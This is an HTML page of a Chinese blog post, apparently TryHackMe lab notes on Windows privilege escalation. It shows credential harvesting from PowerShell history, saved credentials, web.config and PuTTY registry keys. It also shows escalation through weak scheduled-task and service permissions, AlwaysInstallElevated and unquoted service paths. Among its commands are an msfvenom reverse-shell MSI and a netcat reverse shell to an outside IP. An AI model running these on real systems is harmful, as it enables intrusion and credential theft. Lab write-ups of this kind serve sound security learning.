@@ -1,0 +1,1021 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/117073339?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FSRM">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="初识windows提权Windows系统分为两种不同的用户，一种是拥有管理员权限的用户属于管理员组，另一种是拥有普通系统权限的用户，属于用户组。         Administrators 这些用户拥有最高的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。   Standard Users 这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久性或必要的更改，并">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识windows提权">
+<meta property="og:url" content="http://example.com/2024/08/05/windows%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="FSRM">
+<meta property="og:description" content="初识windows提权Windows系统分为两种不同的用户，一种是拥有管理员权限的用户属于管理员组，另一种是拥有普通系统权限的用户，属于用户组。         Administrators 这些用户拥有最高的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。   Standard Users 这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久性或必要的更改，并">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062014616.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062018345.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062026480.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062029502.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062031594.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071510964.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071804837.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081649682.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081657726.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750021.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750486.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091759032.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091807073.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091808769.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091834411.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091839198.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091853700.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091901121.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091904751.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091906501.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012042594.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012103259.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012119276.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012122578.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012127201.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012128551.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229436.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229891.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012235967.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012236789.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012244754.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031546279.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031547977.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031611062.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031620802.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031628623.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031632347.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031635718.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031654370.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031707081.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031718432.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031719957.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031839409.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031849604.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850008.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850965.png">
+<meta property="article:published_time" content="2024-08-05T09:50:14.162Z">
+<meta property="article:modified_time" content="2024-09-03T10:50:40.831Z">
+<meta property="article:author" content="FSRM">
+<meta property="article:tag" content="tryhackme">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062014616.png">
+  
+  
+  
+  <title>初识windows提权 - FSRM</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"yo4o5RmdPYW9bP2LZP2uPFV1-MdYXbMMI","app_key":"ibpxtrAlbUHYQ8KOkGrFgWss","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FSRM</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://img.xjh.me/random_img.php?type=bg&ctype=nature&return=302') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="初识windows提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-05 17:50" pubdate>
+          2024年8月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">初识windows提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="初识windows提权"><a href="#初识windows提权" class="headerlink" title="初识windows提权"></a>初识windows提权</h1><p>Windows系统分为两种不同的用户，一种是拥有管理员权限的用户属于管理员组，另一种是拥有普通系统权限的用户，属于用户组。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Administrators</strong></td>
+<td>这些用户拥有最高的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</td>
+</tr>
+<tr>
+<td><strong>Standard Users</strong></td>
+<td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久性或必要的更改，并且只能访问自己的文件。</td>
+</tr>
+</tbody></table>
+<p>还有一些特殊的内置账户，由Windows系统设置和管理，通常情况下我们无法使用。</p>
+<table>
+<thead>
+<tr>
+<th><strong>SYSTEM / LocalSystem</strong></th>
+<th>操作系统用于执行内部任务的帐户。它对主机上的所有文件和资源具有完全访问权限，甚至比管理员的权限更高。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Local Service</strong></td>
+<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td>
+</tr>
+<tr>
+<td><strong>Network Service</strong></td>
+<td>用于以“最小”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td>
+</tr>
+</tbody></table>
+<p>最低权限和最小权限的区别在于，最低权限在某些特殊情况下也不能进行权限的升级，但最小权限在特殊情况下可以进行权限的升级，完成之后再降为普通权限。(最低权限强调的是整体的策略，而最小权限强调的是特定任务的权限管理)</p>
+<h2 id="从常见地方获取密码："><a href="#从常见地方获取密码：" class="headerlink" title="从常见地方获取密码："></a>从常见地方获取密码：</h2><h3 id="Unattended-Windows-Installations"><a href="#Unattended-Windows-Installations" class="headerlink" title="Unattended Windows Installations"></a>Unattended Windows Installations</h3><p>在大量主机上安装windows时，管理员可以使用windows部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置：</p>
+<ul>
+<li>C:\Unattend.xml</li>
+<li>C:\Windows\Panther\Unattend.xml</li>
+<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
+<li>C:\Windows\system32\sysprep.inf</li>
+<li>C:\Windows\system32\sysprep\sysprep.xml</li>
+</ul>
+<h3 id="Powershell-History"><a href="#Powershell-History" class="headerlink" title="Powershell History"></a>Powershell History</h3><p>每当用户使用 Powershell 运行命令时，它都会被存储到一个保存过去命令记忆的文件中。这对于快速重复以前使用过的命令非常有用。如果用户运行的命令直接在 Powershell 命令行中包含密码，我们则可以在cmd.exe中使用命令 <code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code>来获取历史信息。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062014616.png" srcset="/img/loading.gif" lazyload alt="image-20240806201435413"></p>
+<p>然后上面的命令是在cmd.exe中生效，如果在powshell中的话，需要将%userprofile%替换为<code>$Env:userprofile</code> </p>
+<p>Powshell: <code>type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062018345.png" srcset="/img/loading.gif" lazyload alt="image-20240806201836281"></p>
+<h3 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h3><p>Windows 允许我们使用其他用户的凭据。此功能还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">cmdkey /list<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062026480.png" srcset="/img/loading.gif" lazyload alt="image-20240806202601368"></p>
+<p>我们看不到实际的密码，但我们可以结合<code>runas</code>和<code>/savecred</code>  一起使用</p>
+<p><code>runas /savecred /user:mike.katz cmd.exe</code></p>
+<p>以mike.katz的身份运行cmd，并使用/savecred对凭据进行一个保存。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062029502.png" srcset="/img/loading.gif" lazyload alt="image-20240806202913360"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062031594.png" srcset="/img/loading.gif" lazyload alt="image-20240806203141284"></p>
+<h3 id="IIS-配置"><a href="#IIS-配置" class="headerlink" title="IIS 配置"></a>IIS 配置</h3><p>IIS(Internet 信息服务)是windows中默认安装的web服务器，IIS的网站配置文件存储在名为web.config的文件中，里面可以存放着数据库密码或者身份验证的一些信息。</p>
+<p>下面是常见的web.config的安装位置：</p>
+<ul>
+<li>C:\inetpub\wwwroot\web.config</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
+</ul>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071510964.png" srcset="/img/loading.gif" lazyload alt="image-20240807151007853"></p>
+<h3 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h3><p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户无需每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供日后使用。虽然 PuTTY 不允许用户存储他们的 SSH密码，但它会存储包含明文身份验证凭据的代理配置。</p>
+<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s<br></code></pre></td></tr></table></figure>
+
+<p>SimonTatham是一个人名即PuTTY的创作者。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071804837.png" srcset="/img/loading.gif" lazyload alt="image-20240807180431561"></p>
+<h2 id="其他方法："><a href="#其他方法：" class="headerlink" title="其他方法："></a>其他方法：</h2><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>使用<code>schtasks</code>列出计划任务，在本例中，使用<code>schtasks /query /tn vulntask /fo list /v</code> 列出vulntask任务的详细信息。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081649682.png" srcset="/img/loading.gif" lazyload alt="image-20240808164954610"></p>
+<p>对我们来说重要的是Task To Run 和Run As User这两个参数，一个是计划任务的内容，一个是以什么身份来运行这个计划任务的文件。</p>
+<p>如果当前的用户可以修改或覆盖这个可执行的文件，我们就可以控制该用户执行的内容，从而实现简单的权限提升。</p>
+<p>要检查可执行文件的权限，我们使用<code>icacls</code></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081657726.png" srcset="/img/loading.gif" lazyload alt="image-20240808165723675"></p>
+<p>Users对这个文件具有F权限(完全访问权限，这个权限允许用户执行所有可能的操作)</p>
+<p>然后向这个文件中写入一个反弹shell的命令，并运行它。</p>
+<p><code>echo c:\tools\nc64.exe -e cmd.exe 10.14.74.6 4444 &gt; C:\tasks\schtask.bat</code>  </p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750021.png" srcset="/img/loading.gif" lazyload alt="image-20240808175031930"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750486.png" srcset="/img/loading.gif" lazyload alt="image-20240808175045428"></p>
+<h3 id="始终安装高权限"><a href="#始终安装高权限" class="headerlink" title="始终安装高权限"></a>始终安装高权限</h3><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些文件可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成以管理员权限运行的恶意 MSI 文件。</p>
+<p>此方法需要设置两个注册表值，下面是命令：</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br><span class="hljs-name">C</span>:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure>
+
+<p>然后利用msfvenom生成一个恶意的msi文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi<br></code></pre></td></tr></table></figure>
+
+<p>由于这是一个反向 shell，还应该运行相应配置的Metasploit Handler 模块。传输创建的文件后，可以使用以下命令运行安装程序并接收反向 shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br></code></pre></td></tr></table></figure>
+
+<h2 id="滥用服务错误配置"><a href="#滥用服务错误配置" class="headerlink" title="滥用服务错误配置"></a>滥用服务错误配置</h2><h3 id="Windows-服务"><a href="#Windows-服务" class="headerlink" title="Windows 服务"></a>Windows 服务</h3><p>Windows服务由服务控制管理器(SCM)管理,Windows上的每项服务都会有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件会实现特殊功能以便能够与 SCM 通信，因此并非任何可执行文件都可以作为服务成功启动。每项服务还指定了运行服务的用户帐户。</p>
+<p>使用<code>sc qc</code>来查看某项服务的详细信息。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091759032.png" srcset="/img/loading.gif" lazyload alt="image-20240809175925827"></p>
+<p><strong>BINARY_PATH_NAME</strong>指向的是关联的可执行文件，<strong>SERVICE_START_NAME</strong>指向的是运行该服务的用户。</p>
+<p>服务具有自主访问控制列表(DACL) 它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他特权。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091807073.png" srcset="/img/loading.gif" lazyload alt="image-20240809180723847"></p>
+<p>所有服务配置都存储在注册表中，*<em>HKLM\SYSTEM\CurrentControlSet\Services*</em></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091808769.png" srcset="/img/loading.gif" lazyload alt="image-20240809180845623"></p>
+<h3 id="服务可执行文件的权限不安全"><a href="#服务可执行文件的权限不安全" class="headerlink" title="服务可执行文件的权限不安全"></a>服务可执行文件的权限不安全</h3><p>某项服务的可执行文件的权限相对来说较弱，攻击者可以修改可执行文件的内容。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091834411.png" srcset="/img/loading.gif" lazyload alt="image-20240809183435236"></p>
+<p>对于上面服务执行的用户是svcusr1，我们去查看一下可执行文件的权限。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091839198.png" srcset="/img/loading.gif" lazyload alt="image-20240809183934118"></p>
+<p>everyone组具有M权限(可修改权限)</p>
+<p>首先利用msfvenom生成一个反弹shell的exe文件</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091853700.png" srcset="/img/loading.gif" lazyload alt="image-20240809185310630"></p>
+<p>然后开一个python服务，利用wget把exe文件放到powshell中</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091901121.png" srcset="/img/loading.gif" lazyload alt="image-20240809190155020"></p>
+<p>然后将权限弱的可执行文件进行一个备份，并将生成的恶意文件替换到可执行文件的位置，然后再赋予一个F权限。</p>
+<p><code>move WService.exe WService.exe.bkp</code></p>
+<p><code>move C:\Users\thm-unpriv\rev-svc.exe WService.exe</code></p>
+<p><code>icacls WService.exe /grant Everyone:F</code></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091904751.png" srcset="/img/loading.gif" lazyload alt="image-20240809190407596"></p>
+<p>最后再攻击机上监听端口，并再windows上重启服务。</p>
+<p> <code>sc stop windowsscheduler</code></p>
+<p> <code>sc start windowsscheduler</code></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091906501.png" srcset="/img/loading.gif" lazyload alt="image-20240809190646410"></p>
+<h3 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012042594.png" srcset="/img/loading.gif" lazyload alt="image-20240901204211485"></p>
+<p>如上图所示，这个服务是没有引号的，并且Disk Sorter Enterprise中间是有空格的，SCM不知道执行哪一项 就会出现下面的情况。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Command</td>
+<td>Argument 1</td>
+<td>Argument 2</td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk.exe</td>
+<td>Sorter</td>
+<td>Enterprise\bin\disksrs.exe</td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk Sorter.exe</td>
+<td>Enterprise\bin\disksrs.exe</td>
+<td></td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这与命令提示符解析命令的方式有关。通常，当您发送命令时，空格用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着对未带引号的命令的“正确”解释是执行<code>C:\\MyPrograms\\Disk.exe</code>并将其余部分作为参数。</p>
+<p>SCM 并没有像它应该的那样失败，而是尝试帮助用户并开始按照表中显示的顺序搜索每个二进制文件：</p>
+<ol>
+<li>首先，搜索<code>C:\\MyPrograms\\Disk.exe</code>。如果存在，服务将运行该可执行文件。</li>
+<li>如果后者不存在，它就会搜索<code>C:\\MyPrograms\\Disk Sorter.exe</code>。如果存在，服务就会运行这个可执行文件。</li>
+<li>如果后者不存在，它将搜索<code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>。此选项预计会成功，并且通常会在默认安装中运行。</li>
+</ol>
+<p>从这个行为可以看出问题所在。如果攻击者创建在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。</p>
+<p>通常情况下，服务可执行文件会默认安装在C:\Program Files 或 C:\Program Files (x86) 下。非特权用户不可写，但有些服务会更改它的默认安装位置，如果这些服务的安装位置是我们可以更改的，那么这个漏洞就容易被利用。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012103259.png" srcset="/img/loading.gif" lazyload alt="image-20240901210353113"></p>
